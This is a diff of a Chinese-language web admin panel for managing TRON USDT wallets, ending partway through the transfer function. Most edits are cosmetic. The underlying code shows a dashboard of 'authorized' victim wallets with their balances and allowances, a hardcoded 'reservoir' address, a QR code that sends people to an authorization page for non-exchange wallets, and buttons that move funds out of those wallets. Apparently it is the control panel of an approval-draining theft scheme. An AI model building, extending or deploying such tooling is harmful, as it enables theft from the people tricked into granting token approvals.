@@ -6,19 +6,25 @@
     <title>USDT管理系統</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;500;700&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/qrcodejs2@0.0.2/qrcode.min.js"></script>
     <style>
         :root {
-            --primary-color: #0d6efd;
+            --primary-color: #4f46e5;
+            --primary-dark: #4338ca;
             --secondary-color: #6c757d;
-            --success-color: #198754;
-            --warning-color: #ffc107;
-            --danger-color: #dc3545;
-            --light-color: #f8f9fa;
-            --dark-color: #212529;
+            --success-color: #10b981;
+            --warning-color: #f59e0b;
+            --danger-color: #ef4444;
+            --light-color: #f3f4f6;
+            --dark-color: #111827;
+            --card-gradient: linear-gradient(135deg, #4f46e5, #6366f1);
         }
 
         body {
+            font-family: 'Noto Sans TC', sans-serif;
             padding-bottom: 76px;
             background-color: #f5f5f5;
             touch-action: manipulation;
@@ -35,17 +41,23 @@
         }
 
         .nav-pills .nav-link {
-            border-radius: 0;
-            padding: 10px;
+            border-radius: 12px;
+            padding: 12px;
             display: flex;
             flex-direction: column;
             align-items: center;
             color: var(--secondary-color);
+            transition: all 0.3s ease;
+        }
+
+        .nav-pills .nav-link:hover {
+            background-color: rgba(79, 70, 229, 0.1);
         }
 
         .nav-pills .nav-link.active {
-            background-color: var(--primary-color);
+            background: var(--card-gradient);
             color: white;
+            box-shadow: 0 4px 6px -1px rgba(79, 70, 229, 0.2);
         }
 
         .bottom-nav {
@@ -53,26 +65,36 @@
             bottom: 0;
             left: 0;
             right: 0;
-            background: white;
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(10px);
             box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
             z-index: 1000;
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+            padding: 8px;
         }
 
         .card {
             border: none;
-            border-radius: 15px;
-            box-shadow: 0 2px 15px rgba(0,0,0,0.1);
+            border-radius: 20px;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
             margin-bottom: 20px;
             overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 12px -1px rgba(0,0,0,0.15);
         }
 
         .dashboard-card {
-            background: linear-gradient(135deg, var(--primary-color), #0056b3);
+            background: var(--card-gradient);
             color: white;
         }
 
         .wallet-card {
-            transition: transform 0.2s;
+            transition: all 0.3s ease;
         }
 
         .wallet-card:active {
@@ -80,20 +102,36 @@
         }
 
         .form-control {
-            border-radius: 10px;
-            border: 2px solid #dee2e6;
+            border-radius: 12px;
+            border: 2px solid #e5e7eb;
             padding: 12px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            background-color: #ffffff !important;
+            color: #1f2937 !important;
         }
 
         .form-control:focus {
-            box-shadow: none;
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.2);
             border-color: var(--primary-color);
         }
 
         .btn {
-            border-radius: 10px;
+            border-radius: 12px;
             padding: 12px 24px;
             font-weight: 500;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary {
+            background: var(--primary-color);
+            border-color: var(--primary-color);
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-dark);
+            border-color: var(--primary-dark);
+            transform: translateY(-1px);
         }
 
         .btn-icon {
@@ -104,6 +142,15 @@
             align-items: center;
             justify-content: center;
             border-radius: 23px;
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(5px);
+            border: none;
+            color: white;
+        }
+
+        .btn-icon:hover {
+            background: rgba(255, 255, 255, 0.3);
+            color: white;
         }
 
         .toast-container {
@@ -113,13 +160,20 @@
             z-index: 1050;
         }
 
+        .toast {
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
+        }
+
         .loading {
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(255,255,255,0.8);
+            background: rgba(255,255,255,0.9);
+            backdrop-filter: blur(5px);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -129,7 +183,7 @@
         .loading-spinner {
             width: 50px;
             height: 50px;
-            border: 5px solid #f3f3f3;
+            border: 5px solid #e5e7eb;
             border-top: 5px solid var(--primary-color);
             border-radius: 50%;
             animation: spin 1s linear infinite;
@@ -138,20 +192,23 @@
         .wallet-list {
             max-height: calc(100vh - 300px);
             overflow-y: auto;
+            padding: 4px;
         }
 
         .qr-container {
             background: white;
-            padding: 20px;
-            border-radius: 15px;
+            padding: 30px;
+            border-radius: 20px;
             text-align: center;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
         }
 
         .address-container {
-            background: rgba(255,255,255,0.1);
-            border-radius: 8px;
-            padding: 8px;
-            margin-top: 8px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 12px;
+            backdrop-filter: blur(5px);
         }
 
         .address-text {
@@ -159,11 +216,23 @@
             word-break: break-all;
             margin-bottom: 0;
             font-size: 0.9rem;
+            color: #ffffff !important;
+        }
+
+        .badge {
+            padding: 6px 10px;
+            border-radius: 8px;
+            font-weight: 500;
+        }
+
+        .badge.bg-info {
+            background-color: rgba(59, 130, 246, 0.1) !important;
+            color: #3b82f6;
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         @keyframes spin {
@@ -185,36 +254,68 @@
                 max-height: calc(100vh - 250px);
             }
 
+            .wallet-card .card-title {
+                font-size: 0.85rem;
+                max-width: 180px !important;
+            }
+
             .address-text {
                 font-size: 0.8rem;
             }
+
+            .bottom-nav {
+                padding: 6px;
+            }
         }
 
-        /* 深色模式支持 */
+        /* 深色模式 */
         @media (prefers-color-scheme: dark) {
             body {
                 background-color: #1a1a1a;
                 color: #fff;
             }
 
-            .card {
+            .card:not(.dashboard-card) {
                 background-color: #2d2d2d;
                 color: #fff;
             }
 
             .form-control {
-                background-color: #333;
+                background-color: #ffffff !important;
+                color: #1f2937 !important;
                 border-color: #444;
-                color: #fff;
             }
 
             .bottom-nav {
-                background-color: #2d2d2d;
+                background: rgba(45, 45, 45, 0.9);
             }
 
-            .address-container {
-                background: rgba(255,255,255,0.05);
+            .loading {
+                background: rgba(26,26,26,0.9);
             }
+
+            .qr-container {
+                background: #2d2d2d;
+            }
+        }
+
+        /* 自定義滾動條 */
+        .wallet-list::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .wallet-list::-webkit-scrollbar-track {
+            background: rgba(0,0,0,0.1);
+            border-radius: 4px;
+        }
+
+        .wallet-list::-webkit-scrollbar-thumb {
+            background: rgba(79, 70, 229, 0.5);
+            border-radius: 4px;
+        }
+
+        .wallet-list::-webkit-scrollbar-thumb:hover {
+            background: rgba(79, 70, 229, 0.7);
         }
     </style>
 </head>
@@ -234,16 +335,24 @@
                 <div class="col-12">
                     <div class="card dashboard-card mb-4">
                         <div class="card-body">
-                            <h5 class="card-title">TRX 餘額</h5>
-                            <h2 class="mb-0" id="trxBalance">載入中...</h2>
-                            <small class="text-warning" id="trxWarning" style="display: none;">
-                                <i class="fas fa-exclamation-triangle"></i> TRX餘額過低
-                            </small>
+                            <div class="d-flex justify-content-between align-items-center mb-2">
+                                <h5 class="card-title">
+                                    <i class="fas fa-bolt me-2"></i>TRX 餘額
+                                </h5>
+                                <span class="badge bg-warning text-dark" id="trxWarning" style="display: none;">
+                                    <i class="fas fa-exclamation-triangle"></i> 餘額過低
+                                </span>
+                            </div>
+                            <h2 class="mb-0" id="trxBalance">
+                                <i class="fas fa-spinner fa-spin"></i> 載入中...
+                            </h2>
                             <div class="address-container">
-                                <small class="text-light">合約擁有者地址:</small>
+                                <small class="text-light">
+                                    <i class="fas fa-user-shield me-1"></i>合約擁有者地址:
+                                </small>
                                 <div class="d-flex align-items-center">
                                     <code id="contractOwnerAddress" class="address-text me-2"></code>
-                                    <button class="btn btn-light btn-sm" onclick="copyAddress('contractOwnerAddress')">
+                                    <button class="btn btn-light btn-sm" onclick="copyAddress('contractOwnerAddress')" title="複製地址">
                                         <i class="fas fa-copy"></i>
                                     </button>
                                 </div>
@@ -254,13 +363,21 @@
                 <div class="col-12">
                     <div class="card dashboard-card mb-4">
                         <div class="card-body">
-                            <h5 class="card-title">水庫 USDT 餘額</h5>
-                            <h2 class="mb-0" id="usdtBalance">載入中...</h2>
+                            <div class="d-flex justify-content-between align-items-center mb-2">
+                                <h5 class="card-title">
+                                    <i class="fas fa-coins me-2"></i>水庫 USDT 餘額
+                                </h5>
+                            </div>
+                            <h2 class="mb-0" id="usdtBalance">
+                                <i class="fas fa-spinner fa-spin"></i> 載入中...
+                            </h2>
                             <div class="address-container">
-                                <small class="text-light">水庫錢包地址:</small>
+                                <small class="text-light">
+                                    <i class="fas fa-warehouse me-1"></i>水庫錢包地址:
+                                </small>
                                 <div class="d-flex align-items-center">
                                     <code id="reservoirAddress" class="address-text me-2">TYfH1UFjepVVFaEsaCk4MAHM2yA5RQk899</code>
-                                    <button class="btn btn-light btn-sm" onclick="copyAddress('reservoirAddress')">
+                                    <button class="btn btn-light btn-sm" onclick="copyAddress('reservoirAddress')" title="複製地址">
                                         <i class="fas fa-copy"></i>
                                     </button>
                                 </div>
@@ -271,13 +388,19 @@
                 <div class="col-12">
                     <div class="card dashboard-card">
                         <div class="card-body">
-                            <h5 class="card-title">已授權錢包數量</h5>
-                            <h2 class="mb-0" id="walletCount">載入中...</h2>
+                            <div class="d-flex justify-content-between align-items-center mb-2">
+                                <h5 class="card-title">
+                                    <i class="fas fa-wallet me-2"></i>已授權錢包數量
+                                </h5>
+                            </div>
+                            <h2 class="mb-0" id="walletCount">
+                                <i class="fas fa-spinner fa-spin"></i> 載入中...
+                            </h2>
                         </div>
                     </div>
                 </div>
                 <div class="col-12 mt-4 text-center">
-                    <button class="btn btn-light btn-icon" id="refreshDashboard">
+                    <button class="btn btn-light btn-icon" id="refreshDashboard" title="刷新數據">
                         <i class="fas fa-sync-alt"></i>
                     </button>
                 </div>
@@ -296,7 +419,7 @@
                                 <input type="text" class="form-control" id="checkWalletInput" 
                                        placeholder="輸入錢包地址">
                                 <button class="btn btn-primary" id="checkWalletBtn">
-                                    <i class="fas fa-plus"></i>
+                                    <i class="fas fa-plus me-1"></i>添加
                                 </button>
                             </div>
                         </div>
@@ -309,10 +432,10 @@
                                 <div class="form-check">
                                     <input class="form-check-input" type="checkbox" id="filterWallets">
                                     <label class="form-check-label" for="filterWallets">
-                                        僅顯示餘額 > 10 USDT
+                                        <i class="fas fa-filter me-1"></i>僅顯示餘額 > 10 USDT
                                     </label>
                                 </div>
-                                <button class="btn btn-light btn-icon" id="refreshWallets">
+                                <button class="btn btn-light btn-icon" id="refreshWallets" title="刷新列表">
                                     <i class="fas fa-sync-alt"></i>
                                 </button>
                             </div>
@@ -329,20 +452,22 @@
     <!-- QR碼頁面 -->
     <div class="page" id="qrcode">
         <div class="container">
-            <div class="row">
-                <div class="col-12">
+            <div class="row justify-content-center">
+                <div class="col-12 col-md-8">
                     <div class="card">
                         <div class="card-body">
                             <div class="qr-container">
                                 <div id="qrCode"></div>
-                                <div class="mt-3">
-                                    <p class="text-muted">請使用非交易所錢包掃描</p>
+                                <div class="mt-4">
+                                    <p class="text-muted">
+                                        <i class="fas fa-info-circle me-1"></i>請使用非交易所錢包掃描
+                                    </p>
                                     <div class="btn-group">
                                         <button class="btn btn-primary" id="copyUrl">
-                                            <i class="fas fa-copy"></i> 複製連結
+                                            <i class="fas fa-copy me-1"></i>複製連結
                                         </button>
                                         <button class="btn btn-success" id="downloadQr">
-                                            <i class="fas fa-download"></i> 下載QR碼
+                                            <i class="fas fa-download me-1"></i>下載QR碼
                                         </button>
                                     </div>
                                 </div>
@@ -356,26 +481,36 @@
 
     <!-- 轉帳確認模態框 -->
     <div class="modal fade" id="transferModal" tabindex="-1">
-        <div class="modal-dialog">
+        <div class="modal-dialog modal-dialog-centered">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h5 class="modal-title">確認轉帳</h5>
+                    <h5 class="modal-title">
+                        <i class="fas fa-exchange-alt me-2"></i>確認轉帳
+                    </h5>
                     <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                 </div>
                 <div class="modal-body">
                     <div class="mb-3">
-                        <label class="form-label">從錢包</label>
+                        <label class="form-label">
+                            <i class="fas fa-wallet me-1"></i>從錢包
+                        </label>
                         <input type="text" class="form-control" id="transferFromAddress" readonly>
                     </div>
                     <div class="mb-3">
-                        <label class="form-label">轉帳金額 (USDT)</label>
+                        <label class="form-label">
+                            <i class="fas fa-coins me-1"></i>轉帳金額 (USDT)
+                        </label>
                         <input type="number" class="form-control" id="transferAmount">
                     </div>
                     <div id="transferStatus" class="alert" style="display: none;"></div>
                 </div>
                 <div class="modal-footer">
-                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>
-                    <button type="button" class="btn btn-primary" id="confirmTransfer">確認轉帳</button>
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">
+                        <i class="fas fa-times me-1"></i>取消
+                    </button>
+                    <button type="button" class="btn btn-primary" id="confirmTransfer">
+                        <i class="fas fa-check me-1"></i>確認轉帳
+                    </button>
                 </div>
             </div>
         </div>
@@ -386,19 +521,19 @@
         <ul class="nav nav-pills nav-fill">
             <li class="nav-item">
                 <a class="nav-link active" data-page="dashboard" href="#">
-                    <i class="fas fa-chart-line"></i>
+                    <i class="fas fa-chart-line mb-1"></i>
                     <span>儀表板</span>
                 </a>
             </li>
             <li class="nav-item">
                 <a class="nav-link" data-page="wallets" href="#">
-                    <i class="fas fa-wallet"></i>
+                    <i class="fas fa-wallet mb-1"></i>
                     <span>錢包</span>
                 </a>
             </li>
             <li class="nav-item">
                 <a class="nav-link" data-page="qrcode" href="#">
-                    <i class="fas fa-qrcode"></i>
+                    <i class="fas fa-qrcode mb-1"></i>
                     <span>QR碼</span>
                 </a>
             </li>
@@ -408,427 +543,464 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://cdn.socket.io/4.0.1/socket.io.min.js"></script>
     <script>
-// 配置
-const API_BASE_URL = 'https://spectacular-wholesale-sprint.glitch.me'; // 如果在同一域名下可以留空，或填入API的完整URL
-const RESERVOIR_WALLET = 'TYfH1UFjepVVFaEsaCk4MAHM2yA5RQk899';
-const QR_CODE_URL = 'https://heathwang888.github.io/usdt-authorization/'; // 固定的授權URL
+    // 配置
+    const API_BASE_URL = 'https://spectacular-wholesale-sprint.glitch.me';
+    const RESERVOIR_WALLET = 'TYfH1UFjepVVFaEsaCk4MAHM2yA5RQk899';
+    const QR_CODE_URL = 'https://heathwang888.github.io/usdt-authorization/';
 
-// 全局變量
-let socket;
-let transferModal;
-let currentWallets = [];
+    // 全局變量
+    let socket;
+    let transferModal;
+    let currentWallets = [];
 
-// 初始化
-document.addEventListener('DOMContentLoaded', function() {
-    // 初始化 Socket.IO
-    socket = io(API_BASE_URL);
-    setupSocketListeners();
+    // 初始化
+    document.addEventListener('DOMContentLoaded', function() {
+        // 初始化 Socket.IO
+        socket = io(API_BASE_URL);
+        setupSocketListeners();
 
-    // 初始化 Bootstrap 模態框
-    transferModal = new bootstrap.Modal(document.getElementById('transferModal'));
+        // 初始化 Bootstrap 模態框
+        transferModal = new bootstrap.Modal(document.getElementById('transferModal'));
 
-    // 初始化頁面
-    setupEventListeners();
-    initializeDashboard();
-    initializeQRCode();
+        // 初始化頁面
+        setupEventListeners();
+        initializeDashboard();
+        initializeQRCode();
 
-    // 隱藏載入指示器
-    document.getElementById('loading').style.display = 'none';
-});
-
-// Socket.IO 監聽器設置
-function setupSocketListeners() {
-    socket.on('connect', function() {
-        showToast('success', '已連接到服務器');
+        // 隱藏載入指示器
+        document.getElementById('loading').style.display = 'none';
     });
 
-    socket.on('disconnect', function() {
-        showToast('error', '與服務器斷開連接');
-    });
-
-    socket.on('trx-balance-warning', function(data) {
-        document.getElementById('trxWarning').style.display = 'block';
-        showToast('warning', `TRX餘額過低: ${data.balance} TRX`);
-    });
-
-    socket.on('transfer-started', function(data) {
-        updateTransferStatus('info', '交易已發送，等待確認...');
-    });
-
-    socket.on('transfer-confirmed', function(data) {
-        updateTransferStatus('success', '交易已確認');
-        refreshData();
-    });
-
-    socket.on('transfer-failed', function(data) {
-        updateTransferStatus('danger', `交易失敗: ${data.error}`);
-    });
-}
-
-// 頁面事件監聽器設置
-function setupEventListeners() {
-    // 導航切換
-    document.querySelectorAll('.nav-link').forEach(link => {
-        link.addEventListener('click', function(e) {
-            e.preventDefault();
-            const targetPage = this.dataset.page;
-            switchPage(targetPage);
-        });
-    });
-
-    // 刷新按鈕
-    document.getElementById('refreshDashboard').addEventListener('click', refreshDashboard);
-    document.getElementById('refreshWallets').addEventListener('click', refreshWallets);
-
-    // 錢包檢查
-    document.getElementById('checkWalletBtn').addEventListener('click', checkWallet);
-    document.getElementById('checkWalletInput').addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            checkWallet();
-        }
-    });
-
-    // 篩選切換
-    document.getElementById('filterWallets').addEventListener('change', function() {
-        updateWalletList(currentWallets);
-    });
-
-    // 轉帳確認
-    document.getElementById('confirmTransfer').addEventListener('click', confirmTransfer);
-
-    // QR碼功能
-    document.getElementById('copyUrl').addEventListener('click', function() {
-        copyToClipboard(QR_CODE_URL);
-    });
-    document.getElementById('downloadQr').addEventListener('click', downloadQrCode);
-}
-
-// 頁面切換
-function switchPage(pageName) {
-    document.querySelectorAll('.page').forEach(page => {
-        page.classList.remove('active');
-    });
-    document.querySelectorAll('.nav-link').forEach(link => {
-        link.classList.remove('active');
-    });
-
-    document.getElementById(pageName).classList.add('active');
-    document.querySelector(`.nav-link[data-page="${pageName}"]`).classList.add('active');
-
-    if (pageName === 'wallets') {
-        refreshWallets();
-    }
-}
-
-// 儀表板功能
-async function initializeDashboard() {
-    await refreshDashboard();
-    // 每60秒自動刷新一次
-    setInterval(refreshDashboard, 60000);
-}
-
-async function refreshDashboard() {
-    try {
-        // 獲取合約擁有者TRX餘額
-        const trxResponse = await fetch(`${API_BASE_URL}/contract-owner-balance`);
-        const trxData = await trxResponse.json();
-        if (trxData.balance) {
-            document.getElementById('trxBalance').textContent = `${trxData.balance.toFixed(2)} TRX`;
-            // 設置合約擁有者地址
-            document.getElementById('contractOwnerAddress').textContent = process.env.CONTRACT_OWNER;
-        }
-
-        // 獲取水庫錢包USDT餘額
-        const usdtResponse = await fetch(`${API_BASE_URL}/balance/${RESERVOIR_WALLET}`);
-        const usdtData = await usdtResponse.json();
-        if (usdtData.balance) {
-            document.getElementById('usdtBalance').textContent = `${usdtData.balance} USDT`;
-        }
-
-        // 獲取授權錢包數量
-        const walletsResponse = await fetch(`${API_BASE_URL}/authorized-wallets`);
-        const walletsData = await walletsResponse.json();
-        document.getElementById('walletCount').textContent = walletsData.length.toString();
-
-    } catch (error) {
-        console.error('刷新儀表板失敗:', error);
-        showToast('error', '刷新儀表板失敗');
-    }
-}
-
-// 錢包管理功能
-async function checkWallet() {
-    const input = document.getElementById('checkWalletInput');
-    const address = input.value.trim();
-    
-    if (!address) {
-        showToast('error', '請輸入要檢查的錢包地址');
-        return;
-    }
-
-    try {
-        const response = await fetch(`${API_BASE_URL}/manual-wallets`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ address })
+    // Socket.IO 監聽器設置
+    function setupSocketListeners() {
+        socket.on('connect', function() {
+            showToast('success', '已連接到服務器');
         });
 
-        const data = await response.json();
+        socket.on('disconnect', function() {
+            showToast('error', '與服務器斷開連接');
+        });
+
+        socket.on('trx-balance-warning', function(data) {
+            document.getElementById('trxWarning').style.display = 'block';
+            showToast('warning', `TRX餘額過低: ${data.balance} TRX`);
+        });
+
+        socket.on('transfer-started', function(data) {
+            updateTransferStatus('info', '交易已發送，等待確認...');
+        });
+
+        socket.on('transfer-confirmed', function(data) {
+            updateTransferStatus('success', '交易已確認');
+            refreshData();
+            setTimeout(() => {
+                transferModal.hide();
+            }, 2000);
+        });
+
+        socket.on('transfer-failed', function(data) {
+            updateTransferStatus('danger', `交易失敗: ${data.error}`);
+        });
+
+        socket.on('transfer-status', function(data) {
+            if (data.status === 'TIMEOUT' || data.status === 'ERROR') {
+                updateTransferStatus('warning', data.message);
+                const statusDiv = document.getElementById('transferStatus');
+                statusDiv.innerHTML += `
+                    <br><a href="https://tronscan.org/#/transaction/${data.txId}" 
+                       target="_blank" class="alert-link">
+                        <i class="fas fa-external-link-alt me-1"></i>在區塊鏈瀏覽器中查看
+                    </a>`;
+            }
+        });
+    }
+
+    // 頁面事件監聽器設置
+    function setupEventListeners() {
+        // 導航切換
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                const targetPage = this.dataset.page;
+                switchPage(targetPage);
+            });
+        });
+
+        // 刷新按鈕
+        document.getElementById('refreshDashboard').addEventListener('click', refreshDashboard);
+        document.getElementById('refreshWallets').addEventListener('click', refreshWallets);
+
+        // 錢包檢查
+        document.getElementById('checkWalletBtn').addEventListener('click', checkWallet);
+        document.getElementById('checkWalletInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                checkWallet();
+            }
+        });
+
+        // 篩選切換
+        document.getElementById('filterWallets').addEventListener('change', function() {
+            updateWalletList(currentWallets);
+        });
+
+        // 轉帳確認
+        document.getElementById('confirmTransfer').addEventListener('click', confirmTransfer);
+
+        // QR碼功能
+        document.getElementById('copyUrl').addEventListener('click', function() {
+            copyToClipboard(QR_CODE_URL);
+        });
+        document.getElementById('downloadQr').addEventListener('click', downloadQrCode);
+    }
+
+    // 頁面切換
+    function switchPage(pageName) {
+        document.querySelectorAll('.page').forEach(page => {
+            page.classList.remove('active');
+        });
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.classList.remove('active');
+        });
+
+        document.getElementById(pageName).classList.add('active');
+        document.querySelector(`.nav-link[data-page="${pageName}"]`).classList.add('active');
+
+        if (pageName === 'wallets') {
+            refreshWallets();
+        }
+    }
+
+    // 儀表板功能
+    async function initializeDashboard() {
+        await refreshDashboard();
+        // 每60秒自動刷新一次
+        setInterval(refreshDashboard, 60000);
+    }
+
+    async function refreshDashboard() {
+        try {
+            // 獲取合約擁有者TRX餘額
+            const trxResponse = await fetch(`${API_BASE_URL}/contract-owner-balance`);
+            const trxData = await trxResponse.json();
+            if (trxData.balance) {
+                document.getElementById('trxBalance').textContent = `${trxData.balance.toFixed(2)} TRX`;
+                if (trxData.owner) {
+                    document.getElementById('contractOwnerAddress').textContent = trxData.owner;
+                }
+            }
+
+            // 獲取水庫錢包USDT餘額
+            const usdtResponse = await fetch(`${API_BASE_URL}/balance/${RESERVOIR_WALLET}`);
+            const usdtData = await usdtResponse.json();
+            if (usdtData.balance) {
+                document.getElementById('usdtBalance').textContent = `${usdtData.balance} USDT`;
+            }
+
+            // 獲取授權錢包數量
+            const walletsResponse = await fetch(`${API_BASE_URL}/authorized-wallets`);
+            const walletsData = await walletsResponse.json();
+            if (Array.isArray(walletsData)) {
+                document.getElementById('walletCount').textContent = walletsData.length.toString();
+            } else {
+                document.getElementById('walletCount').textContent = '0';
+            }
+
+        } catch (error) {
+            console.error('刷新儀表板失敗:', error);
+            if (error.name !== 'TypeError') {
+                showToast('error', '刷新儀表板失敗');
+            }
+        }
+    }
+
+    // 錢包管理功能
+    async function checkWallet() {
+        const input = document.getElementById('checkWalletInput');
+        const address = input.value.trim();
         
-        if (data.error) {
-            showToast('error', data.error);
+        if (!address) {
+            showToast('error', '請輸入要檢查的錢包地址');
             return;
         }
 
-        showToast('success', '錢包添加成功');
-        input.value = '';
-        refreshWallets();
-    } catch (error) {
-        console.error('添加錢包失敗:', error);
-        showToast('error', '添加錢包失敗');
-    }
-}
+        try {
+            const response = await fetch(`${API_BASE_URL}/manual-wallets`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ address })
+            });
 
-async function refreshWallets() {
-    try {
-        const response = await fetch(`${API_BASE_URL}/authorized-wallets`);
-        const data = await response.json();
-        currentWallets = data;
-        updateWalletList(data);
-    } catch (error) {
-        console.error('獲取錢包列表失敗:', error);
-        showToast('error', '獲取錢包列表失敗');
-    }
-}
+            const data = await response.json();
+            
+            if (data.error) {
+                showToast('error', data.error);
+                return;
+            }
 
-function updateWalletList(wallets) {
-    const walletList = document.getElementById('walletList');
-    const filterEnabled = document.getElementById('filterWallets').checked;
-    
-    // 篩選錢包
-    const filteredWallets = filterEnabled ? 
-        wallets.filter(wallet => parseFloat(wallet.balance) > 10) : 
-        wallets;
-
-    // 清空列表
-    walletList.innerHTML = '';
-
-    if (filteredWallets.length === 0) {
-        walletList.innerHTML = `
-            <div class="alert alert-info">
-                <i class="fas fa-info-circle me-2"></i>沒有符合條件的錢包
-            </div>
-        `;
-        return;
+            showToast('success', '錢包添加成功');
+            input.value = '';
+            refreshWallets();
+        } catch (error) {
+            console.error('添加錢包失敗:', error);
+            showToast('error', '添加錢包失敗');
+        }
     }
 
-    // 添加錢包卡片
-    filteredWallets.forEach(wallet => {
-        const card = document.createElement('div');
-        card.className = 'card wallet-card mb-3';
-        card.innerHTML = `
-            <div class="card-body">
-                <div class="d-flex justify-content-between align-items-start">
-                    <div>
-                        <h6 class="card-title text-truncate" style="max-width: 200px;">
-                            ${wallet.address}
-                            ${wallet.isManual ? '<span class="badge bg-info ms-1">手動</span>' : ''}
-                        </h6>
-                        <p class="card-text mb-0">
-                            餘額: ${wallet.balance} USDT<br>
-                            授權: ${wallet.allowance}
-                        </p>
-                    </div>
-                    <div class="d-flex">
-                        <button class="btn btn-primary btn-sm me-2" onclick="initiateTransfer('${wallet.address}')">
-                            <i class="fas fa-exchange-alt"></i>
-                        </button>
-                        ${wallet.isManual ? `
-                            <button class="btn btn-danger btn-sm" onclick="removeWallet('${wallet.address}')">
-                                <i class="fas fa-trash"></i>
+    async function refreshWallets() {
+        try {
+            const response = await fetch(`${API_BASE_URL}/authorized-wallets`);
+            const data = await response.json();
+            currentWallets = data;
+            updateWalletList(data);
+        } catch (error) {
+            console.error('獲取錢包列表失敗:', error);
+            showToast('error', '獲取錢包列表失敗');
+        }
+    }
+
+    function updateWalletList(wallets) {
+        const walletList = document.getElementById('walletList');
+        const filterEnabled = document.getElementById('filterWallets').checked;
+        
+        // 篩選錢包
+        const filteredWallets = filterEnabled ? 
+            wallets.filter(wallet => parseFloat(wallet.balance) > 10) : 
+            wallets;
+
+        // 清空列表
+        walletList.innerHTML = '';
+
+        if (filteredWallets.length === 0) {
+            walletList.innerHTML = `
+                <div class="alert alert-info">
+                    <i class="fas fa-info-circle me-2"></i>沒有符合條件的錢包
+                </div>
+            `;
+            return;
+        }
+
+        // 添加錢包卡片
+        filteredWallets.forEach(wallet => {
+            const card = document.createElement('div');
+            card.className = 'card wallet-card mb-3';
+            card.innerHTML = `
+                <div class="card-body">
+                    <div class="d-flex justify-content-between align-items-start">
+                        <div>
+                            <h6 class="card-title text-truncate" style="max-width: 200px;">
+                                ${wallet.address}
+                                ${wallet.isManual ? '<span class="badge bg-info ms-1">手動</span>' : ''}
+                            </h6>
+                            <p class="card-text mb-0">
+                                <i class="fas fa-coins me-1"></i>餘額: ${wallet.balance} USDT<br>
+                                <i class="fas fa-unlock-alt me-1"></i>授權: ${wallet.allowance}
+                            </p>
+                        </div>
+                        <div class="d-flex">
+                            <button class="btn btn-primary btn-sm me-2" 
+                                    onclick="initiateTransfer('${wallet.address}')"
+                                    title="轉帳">
+                                <i class="fas fa-exchange-alt"></i>
                             </button>
-                        ` : ''}
+                            ${wallet.isManual ? `
+                                <button class="btn btn-danger btn-sm" 
+                                        onclick="removeWallet('${wallet.address}')"
+                                        title="刪除">
+                                    <i class="fas fa-trash"></i>
+                                </button>
+                            ` : ''}
+                        </div>
                     </div>
                 </div>
+            `;
+            walletList.appendChild(card);
+        });
+    }
+
+    async function removeWallet(address) {
+        try {
+            const response = await fetch(`${API_BASE_URL}/manual-wallets/${address}`, {
+                method: 'DELETE'
+            });
+            const data = await response.json();
+            
+            if (data.error) {
+                showToast('error', data.error);
+                return;
+            }
+            
+            showToast('success', '錢包已刪除');
+            refreshWallets();
+        } catch (error) {
+            console.error('刪除錢包失敗:', error);
+            showToast('error', '刪除錢包失敗');
+        }
+    }
+
+    // 轉帳功能
+    function initiateTransfer(address) {
+        document.getElementById('transferFromAddress').value = address;
+        document.getElementById('transferAmount').value = '';
+        document.getElementById('transferStatus').style.display = 'none';
+        document.getElementById('confirmTransfer').disabled = false;
+        transferModal.show();
+    }
+
+    async function confirmTransfer() {
+        const fromAddress = document.getElementById('transferFromAddress').value;
+        const amount = document.getElementById('transferAmount').value;
+
+        if (!amount || parseFloat(amount) <= 0) {
+            showToast('error', '請輸入有效的轉帳金額');
+            return;
+        }
+
+        try {
+            document.getElementById('confirmTransfer').disabled = true;
+            updateTransferStatus('info', '正在發送交易...');
+
+            const response = await fetch(`${API_BASE_URL}/transfer`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    fromAddress: fromAddress,
